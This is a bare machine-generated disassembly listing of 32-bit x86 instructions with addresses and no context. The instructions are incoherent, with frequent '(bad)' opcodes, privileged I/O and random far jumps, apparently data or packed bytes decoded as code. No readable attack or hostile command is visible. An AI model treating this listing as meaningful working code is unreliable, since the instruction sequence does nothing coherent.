  423ee8:	add    BYTE PTR [esi],ch
  423eea:	in     al,0xa7
  423eec:	mov    ecx,0x71b93e79
  423ef1:	pop    ds
  423ef2:	repz add BYTE PTR [eax-0x7deae59d],bh
  423ef9:	iret   
  423efa:	dec    ecx
  423efb:	add    edx,edi
  423efd:	cmp    al,0x8a
  423eff:	xor    al,0x4a
  423f01:	mov    dl,0x47
  423f03:	pop    edx
  423f04:	sar    bh,1
  423f06:	jne    0x423ece
  423f08:	leave  
  423f09:	(bad)  
  423f0a:	dec    BYTE PTR [eax-0x56]
  423f0d:	jbe    0x423f53
  423f0f:	in     eax,0x2f
  423f11:	mov    edx,0xa3fe9784
  423f16:	add    bl,ah
  423f18:	loope  0x423f1a
  423f1a:	pop    ecx
  423f1b:	pop    ds
  423f1c:	out    0xcd,eax
  423f1e:	repz imul ebp,DWORD PTR [esi],0x6600a7fe
  423f25:	sbb    ecx,ebp
  423f27:	test   eax,0x79b92c11
  423f2c:	ds int 0x0
  423f2f:	lock cwde 
  423f31:	fs cmp esp,esi
  423f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f35:	add    BYTE PTR [edx-0x5830c8d9],al
  423f3b:	pop    ebx
  423f3c:	sbb    al,0xc5
  423f3e:	mov    dh,0x54
  423f40:	add    BYTE PTR [esp+ecx*4],cl
  423f43:	repz imul ebp,DWORD PTR [esi-0x62],0xcc0857
  423f4b:	sahf   
  423f4c:	push   ebx
  423f4d:	xor    al,0xe1
  423f4f:	jns    0x423f8f
  423f51:	int    0xcd
  423f53:	mov    esp,0xd928007c
  423f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f59:	jae    0x423f89
  423f5b:	mov    edi,0xe4b9a7d1
  423f60:	add    BYTE PTR [edx-0x2d383],bh
  423f66:	mov    ebp,0xb3be0071
  423f6b:	add    BYTE PTR [ebp-0x6f],al
  423f6e:	stc    
  423f6f:	lahf   
  423f70:	inc    esp
  423f71:	add    BYTE PTR es:[eax],bh
  423f74:	mov    cl,0x0
  423f76:	mov    ah,0x22
  423f78:	mov    esp,0x6cf41cbb
  423f7d:	push   0x41
  423f7f:	push   edx
  423f80:	or     al,0xa2
  423f82:	das    
  423f83:	clc    
  423f84:	daa    
  423f85:	xchg   ebp,eax
  423f86:	lea    esi,[esi+0x6aa52c56]
  423f8c:	jnp    0x423f22
  423f8e:	in     al,0x18
  423f90:	(bad)  
  423f91:	mov    edi,0x9541cd23
  423f96:	cmp    eax,0x6a00753f
  423f9b:	or     al,0x4c
  423f9d:	nop
  423f9e:	dec    edi
  423f9f:	cmp    al,0xb
  423fa1:	lods   al,BYTE PTR ds:[esi]
  423fa2:	pusha  
  423fa3:	inc    ebx
  423fa4:	fcom   st(4)
  423fa6:	or     BYTE PTR [edx+0x187c025a],bl
  423fac:	mov    esi,?
  423fae:	push   es
  423faf:	and    DWORD PTR [edx],ecx
  423fb1:	inc    esp
  423fb2:	enter  0x7e2a,0xfe
  423fb6:	loopne 0x423ff8
  423fb8:	or     DWORD PTR [eax-0x80],0xffffff90
  423fbc:	call   0xed5b:0x5e9be678
  423fc3:	mov    eax,0x10ae8afe
  423fc8:	jo     0x423fc7
  423fca:	repz sar edi,1
  423fcd:	pop    eax
  423fce:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fd0:	scas   al,BYTE PTR es:[edi]
  423fd1:	call   0xe252d114
  423fd6:	test   BYTE PTR [eax],0x65
  423fd9:	shl    bl,cl
  423fdb:	stos   DWORD PTR es:[edi],eax
  423fdc:	fst    DWORD PTR [esi]
  423fde:	push   0x4c52ecd7
  423fe3:	mov    eax,0x401309ff
  423fe8:	mov    eax,ds:0xc05515a0
  423fed:	add    eax,0x1422048c
  423ff2:	nop
  423ff3:	inc    edx
  423ff4:	int    0xbe
  423ff6:	mov    eax,ds:0x729ffeb2
  423ffb:	sbb    eax,esp
  423ffd:	cmp    dl,0x0
  424000:	adc    eax,0x422287b
  424005:	aaa    
  424006:	ins    BYTE PTR es:[edi],dx
  424007:	sbb    eax,0x7ef26886
  42400c:	cmp    al,0x3a
  42400e:	mov    ebx,0xdbfe77
  424013:	dec    esp
  424014:	lea    ebp,[eax-0x18]
  424017:	cmp    dl,BYTE PTR [edx-0x7131bb27]
  42401d:	mov    esi,0x5e6af41
  424022:	cld    
  424023:	cmp    DWORD PTR [eax],eax
  424025:	inc    ebx
  424026:	popa   
  424027:	je     0x424028
  424029:	fidivr DWORD PTR [esi-0x13]
  42402c:	push   0x20db4d6a
  424031:	fcomp  QWORD PTR [edx]
  424033:	pop    esi
  424034:	sbb    al,0x78
  424036:	fwait
  424037:	push   edi
  424038:	mov    edi,0xfe173f34
  42403d:	push   ebx
  42403e:	add    BYTE PTR [ecx+0x4],ch
  424041:	add    BYTE PTR [esi],bl
  424043:	fs pop ebp
  424045:	mov    bl,0x0
  424047:	(bad)  
  424049:	scas   al,BYTE PTR es:[edi]
  42404a:	mov    ds:0x59005ee6,al
  42404f:	push   eax
  424050:	sub    al,0x40
  424052:	push   eax
  424053:	push   cs
  424054:	inc    edi
  424055:	loop   0x424011
  424057:	pusha  
  424058:	xchg   eax,esp
  42405a:	adc    edi,esi
  42405c:	lods   eax,DWORD PTR ds:[esi]
  42405d:	push   esi
  42405e:	not    BYTE PTR [edx]
  424060:	stc    
  424061:	push   edx
  424062:	add    ch,ah
  424064:	jo     0x42407a
  424066:	call   0x160e:0x2684c0dc
  42406d:	sub    bh,BYTE PTR [ebx-0x78]
  424070:	sbb    eax,0xfe510dcc
  424075:	cmp    esp,DWORD PTR [ecx]
  424077:	mov    esi,0x686b813c
  42407c:	int    0x37
  42407e:	pop    ecx
  42407f:	lods   eax,DWORD PTR ds:[esi]
  424080:	cs push ss
  424082:	sbb    ah,BYTE PTR [ebp-0x7926891e]
  424088:	jbe    0x424088
  42408a:	pop    esi
  42408b:	push   ss
  42408c:	fst    DWORD PTR [esi+0x57]
  42408f:	(bad)  
  424090:	hlt    
  424091:	mov    dh,0xcd
  424093:	push   0x21c36a97
  424098:	(bad)  
  424099:	pop    ds
  42409a:	enter  0xb898,0x48
  42409e:	mov    al,0xda
  4240a0:	shl    DWORD PTR [eax-0x1016ec0],1
  4240a6:	xchg   ebp,eax
  4240a7:	pop    edx
  4240a8:	push   es
  4240a9:	jle    0x424056
  4240ab:	mov    ds:0xe8e80b5d,al
  4240b0:	sbb    al,0xf8
  4240b2:	sub    BYTE PTR [esi-0x4d4c8c79],dh
  4240b8:	(bad)  
  4240b9:	sbb    al,BYTE PTR [ebx]
  4240bb:	in     eax,0x79
  4240bd:	in     al,dx
  4240be:	add    BYTE PTR [ebx-0x2],cl
  4240c1:	inc    BYTE PTR [ebx+0x6c]
  4240c4:	pop    ebp
  4240c5:	mov    WORD PTR [ebx-0x103d36c],ds
  4240cb:	pop    edx
  4240cc:	add    BYTE PTR [bp+0x76],bl
  4240d1:	pop    esi
  4240d2:	test   al,0x28
  4240d4:	pop    eax
  4240d5:	pusha  
  4240d6:	inc    edx
  4240d7:	xchg   edx,eax
  4240d8:	pop    eax
  4240d9:	mov    ah,0x5a
  4240db:	rcr    al,1
  4240dd:	xor    eax,0x475fff
  4240e2:	(bad)  
  4240e3:	(bad)  
  4240e4:	lods   eax,DWORD PTR ds:[esi]
  4240e5:	add    cl,al
  4240e7:	pop    ebx
  4240e8:	add    BYTE PTR [edx-0x4e],cl
  4240eb:	add    ch,bl
  4240ed:	fadd   QWORD PTR ds:0xf2143426
  4240f3:	int3   
  4240f4:	mov    esp,0x9d6cd46d
  4240f9:	adc    al,al
  4240fb:	ins    BYTE PTR es:[edi],dx
  4240fc:	xchg   DWORD PTR [eax-0x414c5001],edi
  424102:	push   0x18
  424104:	pop    esi
  424105:	int    0x9b
  424107:	or     al,0xe0
  424109:	inc    eax
  42410a:	arpl   WORD PTR [eax],ax
  42410c:	int    0x39
  42410e:	jge    0x42410f
  424110:	push   0x10ff32eb
  424115:	jle    0x424117
  424117:	out    0xe9,al
  424119:	add    BYTE PTR [edi],dl
  42411b:	jp     0x4240a3
  42411d:	outs   dx,BYTE PTR ds:[esi]
  42411e:	cs leave 
  424120:	sub    DWORD PTR [ecx+0x65],ebx
  424123:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424125:	(bad)  
  424126:	fisttp WORD PTR [esi+0x0]
  424129:	shl    BYTE PTR [ebp+0x684087e5],1
  42412f:	jo     0x42419d
  424131:	test   BYTE PTR [eax],0x83
  424134:	in     eax,dx
  424135:	jbe    0x424159
  424137:	mov    ah,BYTE PTR [esi+0x5225bc54]
  42413d:	adc    eax,0xb65a2868
  424142:	aam    0x97
  424144:	enter  0xb4fa,0xa8
  424148:	mov    ds:0x402cffc1,al
  42414d:	push   0xffffffa9
  42414f:	je     0x424195
  424151:	sub    eax,0xbf5dcfcd
  424156:	repnz adc edi,DWORD PTR [ebx-0x2]
  42415a:	xchg   esi,eax
  42415b:	add    BYTE PTR [esi+0x20],cl
  42415e:	add    BYTE PTR [edx],ah
  424160:	push   ebx
  424161:	xchg   BYTE PTR [ebp-0x6886d007],ch
  424167:	add    dl,dh
  424169:	jb     0x42416b
  42416b:	jne    0x4241e1
  42416d:	and    ah,BYTE PTR [eax+eax*8+0x68]
  424171:	push   0x54058878
  424176:	sub    eax,0x3249fea3
  42417b:	or     BYTE PTR [eax+eiz*4-0x71590f17],bh
  424182:	call   0xee430f9d
  424187:	(bad)  
  424188:	out    dx,al
  424189:	int    0xf3
  42418b:	mov    ds:0xdb6cb056,al
  424190:	mov    ds:0x46ee4848,al
  424195:	(bad)  
  424196:	adc    DWORD PTR [eax],eax
  424198:	sub    ecx,DWORD PTR [edi+0x60]
  42419b:	fwait
  42419c:	scas   al,BYTE PTR es:[edi]
  42419d:	jae    0x42417d
  42419f:	add    BYTE PTR [ebp+0x68558480],al
  4241a5:	sub    BYTE PTR [ebp+0x5],dl
  4241a8:	dec    edi
  4241a9:	pop    eax
  4241aa:	shr    BYTE PTR [ebx-0x32],0xfe
  4241ae:	mov    eax,ds:0xedd86efc
  4241b3:	push   esi
  4241b4:	xor    al,0xb
  4241b6:	mov    ah,0xa7
  4241b8:	jo     0x424170
  4241ba:	call   FWORD PTR [edx+0x2933b225]
  4241c0:	out    0x45,al
  4241c2:	aas    
  4241c3:	shr    DWORD PTR [eax+edx*1-0x1b3dd02],1
  4241ca:	iret   
  4241cb:	add    BYTE PTR [ebp-0x6d],bh
  4241ce:	stos   BYTE PTR es:[edi],al
  4241cf:	add    BYTE PTR [ebp-0x19],cl
  4241d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241d3:	add    BYTE PTR [edx],ch
  4241d5:	push   edx
  4241d6:	cs jl  0x4241c8
  4241d9:	pop    esp
  4241da:	mov    ebx,0x4854b10e
  4241df:	adc    dh,bh
  4241e1:	ss push eax
  4241e3:	aas    
  4241e4:	mov    fs,eax
  4241e6:	ss cdq 
  4241e8:	add    bh,BYTE PTR [ebx+0x364ac6ce]
  4241ee:	push   ss
  4241ef:	sub    BYTE PTR [eax],bh
  4241f1:	pop    ebp
  4241f2:	and    WORD PTR [ebx-0x7b570069],0xff80
  4241fa:	dec    ecx
  4241fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241fc:	pop    edx
  4241fd:	shr    DWORD PTR [edi-0x4c],0xa5
  424201:	and    dh,BYTE PTR [ebp+0x684a9fa]
  424207:	jp     0x424213
  424209:	call   0xc2f27152
  42420e:	or     BYTE PTR [edx],0xb9
  424211:	sbb    edi,esi
  424213:	sub    ah,al
  424215:	into   
  424216:	aam    0xc
  424218:	mov    ecx,DWORD PTR [edx+0x4efe9dc8]
  42421e:	add    BYTE PTR [eax-0x7d7518e4],0x26
  424225:	pop    ebx
  424226:	mov    al,0x1e
  424228:	mov    eax,ds:0xdeecbe0a
  42422d:	repz dec esp
  42422f:	push   esp
  424230:	pop    eax
  424231:	rol    DWORD PTR [esi-0x112fdff3],cl
  424237:	mov    dl,0xca
  424239:	(bad)  
  42423a:	sub    BYTE PTR [ebp+0x1476d440],al
  424240:	cmp    al,0x3
  424242:	mov    ds:0xd6dcf177,al
  424247:	bound  edx,QWORD PTR [edx-0x3354524b]
  42424d:	sti    
  42424e:	dec    BYTE PTR [edx]
  424250:	mov    dl,0xc6
  424252:	div    BYTE PTR [esi-0x11]
  424255:	push   edx
  424256:	ins    DWORD PTR es:[edi],dx
  424257:	or     eax,0x4cfee16d
  42425c:	jl     0x4242cd
  42425e:	mov    al,0x5b
  424260:	cs and edi,0x9378ec53
  424267:	sub    dh,0x65
  42426a:	mov    ah,0x0
  42426c:	and    esp,DWORD PTR [edx+0x10bed596]
  424272:	inc    ebp
  424273:	push   edi
  424274:	push   ecx
  424275:	inc    ebx
  424276:	mov    dh,0x2
  424278:	xor    esp,DWORD PTR [esi]
  42427a:	pop    ecx
  42427b:	adc    al,0xd7
  42427d:	jl     0x4242f4
  42427f:	push   esi
  424280:	inc    ebx
  424281:	push   ebp
  424282:	mov    WORD PTR [esi-0xec2b3d],ss
  424288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424289:	sub    BYTE PTR [eax+0x6782a8ad],dh
  42428f:	enter  0xd0a1,0x8a
  424293:	pop    ss
  424294:	cs (bad) 
  424297:	or     al,0x6b
  424299:	mov    al,0x21
  42429b:	rol    BYTE PTR [eax+0x66a2a65f],0x5b
  4242a2:	test   DWORD PTR [edi+edx*4+0x2e783946],eax
  4242a9:	push   ss
  4242aa:	dec    eax
  4242ab:	ficom  DWORD PTR ds:0xb3fe6d57
  4242b1:	add    DWORD PTR [eax],0x5300f03b
  4242b7:	pop    esi
  4242b8:	push   0xfffffffc
  4242ba:	adc    al,BYTE PTR [eax]
  4242bc:	push   esi
  4242bd:	cli    
  4242be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242bf:	or     eax,0x500d058e
  4242c4:	adc    ch,BYTE PTR fs:[edx]
  4242c7:	or     dh,BYTE PTR [edx+0x38]
  4242ca:	leave  
  4242cb:	adc    BYTE PTR [ebp+0x68],ch
  4242ce:	push   0x5d08e3b2
  4242d3:	push   esi
  4242d4:	mov    ebp,0x6dac8c06
  4242d9:	jo     0x4242c7
  4242db:	nop
  4242dc:	adc    eax,0x9b800c86
  4242e1:	inc    esi
  4242e2:	fisub  WORD PTR cs:[eax-0x7495950c]
  4242e9:	es mov edx,0x2ea08203
  4242ef:	cmp    edi,edi
  4242f1:	xchg   edx,eax
  4242f2:	inc    ebp
  4242f3:	sbb    eax,0xe944368d
  4242f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242f9:	inc    DWORD PTR [edx]
  4242fb:	and    al,0x89
  4242fd:	sub    al,0x98
  4242ff:	jmp    0x4242b1
  424301:	adc    eax,0xc471d81d
  424306:	mov    al,0xc0
  424308:	xor    al,0x6
  42430a:	add    DWORD PTR [esp+edx*8-0x7a],ecx
  42430e:	inc    ebx
  42430f:	jl     0x4242c0
  424311:	daa    
  424312:	add    BYTE PTR [eax+0x28],ch
  424315:	(bad)  
  424316:	push   ss
  424317:	xor    dl,BYTE PTR [ecx+0x5ec751c0]
  42431d:	cli    
  42431e:	les    edx,FWORD PTR [ebp-0x6f61a001]
  424324:	hlt    
  424325:	in     al,dx
  424326:	or     al,0x72
  424328:	ret    
  424329:	cs push cs
  42432b:	fst    DWORD PTR [ebp+0x2b006efe]
  424331:	xlat   BYTE PTR ds:[ebx]
  424332:	push   esp
  424333:	push   ss
  424334:	xor    eax,0x327a2a14
  424339:	jo     0x424339
  42433b:	xor    esi,esi
  42433d:	mov    cl,0xa3
  42433f:	xchg   edi,eax
  424340:	cmp    dl,BYTE PTR [esi-0x42]
  424343:	dec    esp
  424344:	xor    eax,0xc7fff66c
  424349:	mov    al,0x75
  42434b:	cmp    DWORD PTR [eax+0x74ff8690],ebp
  424351:	mov    bl,0xe8
  424353:	mov    dh,0x76
  424355:	xchg   edi,eax
  424356:	call   0xaca0:0x8ff9d4c
  42435d:	sar    edi,cl
  42435f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424360:	daa    
  424361:	push   esp
  424362:	mov    esi,0x2000ed41
  424367:	sbb    BYTE PTR [esi+0x2d1b6b5c],al
  42436d:	sub    dl,ch
  42436f:	call   edx
  424371:	in     al,dx
  424372:	test   eax,0xffd02872
  424377:	outs   dx,BYTE PTR ds:[esi]
  424378:	data16 mov al,ds:0x2c48e9b6
  42437e:	lea    eax,[esi+eax*1]
  424381:	rcl    DWORD PTR [eax],0xd4
  424384:	push   ecx
  424385:	sbb    BYTE PTR [ecx-0x10],0xfe
  424389:	jp     0x42431b
  42438b:	inc    ebx
  42438c:	inc    esi
  42438d:	cmp    al,0x68
  42438f:	inc    ecx
  424390:	xchg   ebx,eax
  424391:	fimul  WORD PTR [esi-0x3a18630a]
  424397:	(bad)  
  424398:	jl     0x4243af
  42439a:	lods   eax,DWORD PTR ds:[esi]
  42439b:	push   ebp
  42439c:	adc    al,0xe4
  42439e:	cmp    ebp,DWORD PTR [eax]
  4243a0:	add    eax,0xdcee6c52
  4243a5:	push   edx
  4243a6:	out    0x84,al
  4243a8:	lods   eax,DWORD PTR ds:[esi]
  4243a9:	mov    ds:0x1b00f9e3,al
  4243ae:	jb     0x42438f
  4243b0:	cmp    ah,ch
  4243b2:	sub    al,0xb8
  4243b5:	mov    edx,0xfef0df04
  4243ba:	sahf   
  4243bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243bc:	mov    ds,WORD PTR [edx]
  4243be:	add    dh,dl
  4243c0:	shr    DWORD PTR [edx+ecx*2+0x4d],1
  4243c4:	test   al,0xe1
  4243c6:	dec    ecx
  4243c7:	fwait
  4243c8:	call   0x585e9c64
  4243cd:	bound  esp,QWORD PTR [ecx-0x4ec00660]
  4243d3:	dec    BYTE PTR [edx+0x4e]
  4243d6:	(bad)  
  4243d7:	xor    al,0x81
  4243d9:	add    ah,cl
  4243db:	enter  0x3800,0xe2
  4243df:	pop    ebp
  4243e0:	mov    ecx,DWORD PTR [ebp*4-0x2529c594]
  4243e7:	and    dh,ah
  4243e9:	adc    DWORD PTR [esi-0x2],edi
  4243ec:	cli    
  4243ed:	or     eax,0xf9ec0b
  4243f2:	mov    dl,0xfd
  4243f4:	add    bh,dh
  4243f6:	mov    edi,DWORD PTR [edx]
  4243f8:	or     al,0xd
  4243fa:	sti    
  4243fb:	dec    edx
  4243fc:	push   ds
  4243fd:	sub    al,0x5d
  4243ff:	mov    eax,DWORD PTR [esp+edx*1+0x62]
  424403:	test   eax,0x6c54fe63
  424408:	xchg   ebx,eax
  424409:	and    DWORD PTR [esi-0x12],edx
  42440c:	es fdivp st(7),st
  42440f:	les    esp,FWORD PTR ds:0xad00100c
  424415:	cmc    
  424416:	fidiv  DWORD PTR [eax+0x19]
  424419:	push   edi
  42441a:	adc    DWORD PTR [edi],0x9422933a
  424420:	push   0x6aa27068
  424425:	jb     0x424425
  424427:	mov    al,0xc8
  424429:	inc    esp
  42442a:	or     DWORD PTR [ebp*4+0x41faa86d],ebx
  424431:	bound  ebx,QWORD PTR ds:0x88411644
  424437:	mov    edi,0x589f456c
  42443c:	rcr    BYTE PTR [edx+edi*1],1
  42443f:	pushf  
  424440:	cmova  edi,esi
  424443:	xor    ebx,edx
  424445:	cmc    
  424446:	rcl    DWORD PTR [edx-0x5e],1
  424449:	sbb    eax,0x7a37fefc
  42444e:	(bad)  
  42444f:	mov    ebp,0x5a20db02
  424454:	cmp    ch,BYTE PTR [esi]
  424456:	push   esi
  424457:	xor    cl,BYTE PTR [eax]
  424459:	mov    al,0x2f
  42445b:	(bad)  
  42445c:	shl    dh,cl
  42445e:	jg     0x424430
  424460:	mov    ch,dh
  424462:	and    bl,BYTE PTR [ecx-0x23]
  424465:	dec    BYTE PTR [ebp-0x1121ff6f]
  42446b:	add    BYTE PTR [esp+ebp*2],ah
  42446e:	add    eax,0xbffe5d8e
  424473:	adc    al,0x30
  424475:	xchg   esi,eax
  424476:	mov    ebx,0x448e250a
  42447b:	inc    ebx
  42447c:	ret    
  42447d:	xor    BYTE PTR [bx+di],ah
  424480:	mov    ah,dh
  424482:	lea    edi,[edx+0x7d]
  424485:	lds    esi,FWORD PTR [ebx]
  424487:	add    al,0x3c
  424489:	(bad)  
  42448a:	adc    ebp,eax
  42448c:	dec    eax
  42448d:	push   0x52
  42448f:	pop    edx
  424490:	inc    ebx
  424491:	push   ecx
  424492:	inc    ebp
  424493:	xor    BYTE PTR [esi+eax*4],bl
  424496:	aam    0x46
  424498:	(bad)  
  424499:	addr16 sub al,dh
  42449c:	int    0xb0
  42449e:	std    
  42449f:	mov    ah,al
  4244a1:	arpl   WORD PTR [eax+0x64],ax
  4244a4:	add    BYTE PTR [edi-0x78],bh
  4244a7:	jp     0x42450e
  4244a9:	mov    al,0x5e
  4244ab:	and    bl,al
  4244ad:	rcl    BYTE PTR [ebx],1
  4244af:	xchg   BYTE PTR [ebp+0x4a],ch
  4244b2:	jmp    FWORD PTR [eax-0x7d4f6a14]
  4244b8:	push   esi
  4244b9:	fldenv [eax]
  4244bb:	push   esp
  4244bc:	(bad)  
  4244bd:	and    eax,0x42dcc921
  4244c2:	push   ds
  4244c3:	fcmovbe st,st(0)
  4244c5:	or     DWORD PTR [ebx+0x5fff0c18],eax
  4244cb:	ret    0x30c8
  4244ce:	mov    cl,0x35
  4244d0:	(bad)  [esi+ebx*4]
  4244d3:	jo     0x424533
  4244d5:	inc    ecx
  4244d6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4244d8:	out    dx,eax
  4244d9:	mov    al,ds:0xfaf426b
  4244de:	loopne 0x424521
  4244e0:	retf   0xb5fe
  4244e3:	into   
  4244e4:	add    al,0xfe
  4244e6:	inc    ebp
  4244e7:	ins    DWORD PTR es:[edi],dx
  4244e8:	imul   edi,esi,0x66b70033
  4244ee:	add    BYTE PTR ds:0x2d820e3f,ah
  4244f4:	ret    0xdbbb
  4244f7:	loope  0x424482
  4244f9:	sbb    eax,0xff10ec6c
  4244fe:	data16 sbb al,0x77
  424501:	xchg   esp,eax
  424502:	inc    ecx
  424503:	xchg   ebp,eax
  424504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424505:	pop    edx
  424506:	sub    eax,0x36ff90d0
  42450b:	rcl    BYTE PTR [esi+0x456c1b34],cl
  424511:	sub    eax,DWORD PTR [edx-0x1ddbc56]
  424517:	test   DWORD PTR ds:0x58868336,ebx
  42451d:	mov    ch,0xf0
  42451f:	ret    0xe00d
  424522:	dec    BYTE PTR [ebp+0x485abbcd]
  424528:	mov    esi,0xbb34fe15
  42452d:	add    ch,cl
  42452f:	xor    BYTE PTR [edi-0x30],bh
  424532:	ss xor al,0xe8
  424535:	sbb    al,0xfe
  424537:	mov    esi,0x3aa2873e
  42453c:	cmc    
  42453d:	push   esi
  42453e:	xor    al,0x5d
  424540:	(bad)  
  424541:	mov    al,0x13
  424543:	cmp    dh,0xfb
  424546:	jl     0x424506
  424548:	sub    al,0x63
  42454a:	ficom  DWORD PTR [eax-0x73]
  42454d:	aaa    
  42454e:	lods   al,BYTE PTR ds:[esi]
  42454f:	(bad)  
  424550:	cs push esi
  424552:	out    dx,eax
  424553:	fsub   DWORD PTR [edx+0x3466d855]
  424559:	fsubr  QWORD PTR [ebp-0x5a]
  42455c:	pop    eax
  42455d:	inc    eax
  42455e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42455f:	xchg   esp,eax
  424560:	sahf   
  424561:	movq   mm5,mm0
  424564:	mov    ch,0xd6
  424566:	shr    DWORD PTR ds:0x313e04ff,cl
  42456c:	dec    ecx
  42456d:	add    BYTE PTR [ebx-0x1],dh
  424570:	pop    ss
  424571:	mov    ah,0xb6
  424573:	mov    ch,0xc
  424575:	push   0xffffffc4
  424577:	inc    eax
  424578:	or     BYTE PTR [edi-0x42],0xd2
  42457c:	jl     0x4245fa
  42457e:	pusha  
  42457f:	imul   eax,DWORD PTR [eax],0xaef2bf8b
  424585:	or     eax,0xfe3afde6
  42458a:	and    eax,DWORD PTR [eax]
  42458c:	int    0xcb
  42458e:	mov    ds:0xbe3f00bb,eax
  424593:	add    BYTE PTR [ebx-0x2b],bl
  424596:	rcr    BYTE PTR [edx+0x620a3bbf],1
  42459c:	dec    edx
  42459d:	xchg   edi,eax
  42459e:	fdivrp st(1),st
  4245a0:	xor    eax,0xcbb4547c
  4245a5:	cs (bad) 
  4245a7:	je     0x4245c5
  4245a9:	xchg   edi,eax
  4245aa:	mov    BYTE PTR [esi-0x4fd4b71e],ch
  4245b0:	shl    DWORD PTR [edx+ebx*1],0xc4
  4245b4:	mov    ebx,gs
  4245b6:	outs   dx,DWORD PTR ds:[esi]
  4245b7:	call   DWORD PTR [esi]
  4245b9:	cmp    DWORD PTR [eax-0x78],esi
  4245bc:	fadd   DWORD PTR [esp+edi*4-0x5a]
  4245c0:	cmp    BYTE PTR [ebp-0x8],ch
  4245c3:	popa   
  4245c4:	and    DWORD PTR [ebp+0x3e70fe91],ebp
  4245ca:	jle    0x424581
  4245cc:	dec    edx
  4245cd:	xor    edx,edx
  4245cf:	inc    DWORD PTR [esi-0x3]
  4245d2:	or     BYTE PTR [esi+0x22],ah
  4245d5:	push   0xffffffce
  4245d7:	dec    edi
  4245d8:	mov    ds:0xee20b2ad,eax
  4245dd:	adc    DWORD PTR [esi+0x5877ff],0xffffffde
  4245e4:	add    DWORD PTR [ebx],ebx
  4245e6:	call   0xe64d:0x40e0fe1a
  4245ed:	sahf   
  4245ee:	bound  esp,QWORD PTR [ebx-0xa6e940]
  4245f4:	sahf   
  4245f5:	call   eax
  4245f7:	lods   al,BYTE PTR ds:[esi]
  4245f8:	test   al,0xad
  4245fa:	add    eax,0xfe571545
  4245ff:	mov    cl,0x0
  424601:	push   cs
  424602:	mov    esi,0x3c027a3f
  424607:	dec    ebx
  424608:	adc    BYTE PTR [edx-0x1445f06],al
  42460e:	add    BYTE PTR [edx-0x3c5c57a8],0x26
  424615:	and    al,0x16
  424617:	lds    eax,FWORD PTR [ecx-0x1]
  42461a:	sub    DWORD PTR [edx+eiz*4-0x4f43c2ab],eax
  424621:	push   0xfec031fe
  424626:	fs ss pop ecx
  424629:	pusha  
  42462a:	fwait
  42462b:	push   ds
  42462c:	mov    ah,0x82
  42462e:	jle    0x424646
  424630:	(bad)  
  424631:	sbb    BYTE PTR [edx],cl
  424633:	daa    
  424634:	mov    edx,fs
  424636:	retf   0xac0b
  424639:	push   ecx
  42463a:	pushf  
  42463b:	cmp    esi,edi
  42463d:	(bad)  
  42463e:	mov    bh,0xe4
  424640:	jle    0x424627
  424642:	jae    0x424636
  424644:	popf   
  424645:	add    BYTE PTR [eax],dl
  424647:	push   0x8df663c2
  42464c:	add    al,al
  42464e:	cmp    BYTE PTR [eax],al
  424650:	xchg   BYTE PTR ds:[esi],cl
  424653:	push   0x4f
  424655:	icebp  
  424656:	icebp  
  424657:	push   ss
  424658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424659:	jmp    DWORD PTR [esi-0x49da5c02]
  42465f:	out    0x31,al
  424661:	add    BYTE PTR [edi-0x32],cl
  424664:	xchg   esp,eax
  424665:	es stos DWORD PTR es:[edi],eax
  424667:	pusha  
  424668:	sbb    bl,BYTE PTR ds:[edx-0x39]
  42466c:	adc    dh,bh
  42466e:	dec    esi
  42466f:	fisubr DWORD PTR [esi]
  424671:	imul   ecx,DWORD PTR [esi],0xffffffa4
  424674:	adc    dh,0x3a
  424677:	rcl    DWORD PTR [eax],1
  424679:	(bad)  
  42467a:	dec    BYTE PTR [esp+ebp*4]
  42467d:	lahf   
  42467e:	cmp    cl,BYTE PTR [eax]
  424680:	ins    DWORD PTR es:[edi],dx
  424681:	jmp    0xf0e:0x9c1eb07a
  424688:	hlt    
  424689:	adc    DWORD PTR [edi-0x426fa62f],ebp
  42468f:	inc    eax
  424690:	push   edx
  424691:	add    BYTE PTR [edx+0x12],dl
  424694:	hlt    
  424695:	push   0x5ae00e44
  42469a:	je     0x4246e7
  42469c:	add    BYTE PTR [ebp-0x2],al
  42469f:	xlat   BYTE PTR ds:[ebx]
  4246a0:	pushf  
  4246a1:	into   
  4246a2:	inc    esi
  4246a3:	mov    esi,0xcd0d6a3e
  4246a8:	jl     0x424720
  4246aa:	jnp    0x424714
  4246ac:	clc    
  4246ad:	loop   0x424726
  4246af:	push   DWORD PTR [ebx-0x4e]
  4246b2:	xor    BYTE PTR [esi-0x2d1d3c5f],0x6f
  4246b9:	ret    0x2ced
  4246bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246bd:	stos   BYTE PTR es:[edi],al
  4246be:	xlat   BYTE PTR ds:[ebx]
  4246bf:	out    0xcd,al
  4246c1:	push   eax
  4246c2:	inc    esi
  4246c3:	sub    BYTE PTR [esi-0x12],ch
  4246c6:	in     eax,0x24
  4246c8:	add    BYTE PTR [ebx-0x1f],ah
  4246cb:	and    bh,bh
  4246cd:	sbb    bl,BYTE PTR [eax+esi*4+0x5b0adda2]
  4246d4:	call   0x6f36:0xa3d57aff
  4246db:	mov    bh,dh
  4246dd:	push   ebx
  4246de:	rcl    DWORD PTR [eax],1
  4246e0:	add    BYTE PTR [edi-0x33],cl
  4246e3:	or     al,0x3c
  4246e5:	add    bl,BYTE PTR [ebp-0x45]
  4246e8:	fcmove st,st(1)
  4246ea:	out    dx,al
  4246eb:	inc    edi
  4246ec:	mov    ebp,es
  4246ee:	add    al,0x3e
  4246f0:	adc    BYTE PTR [ebp+0x61],0xde
  4246f4:	aam    0xff
  4246f6:	jle    0x424686
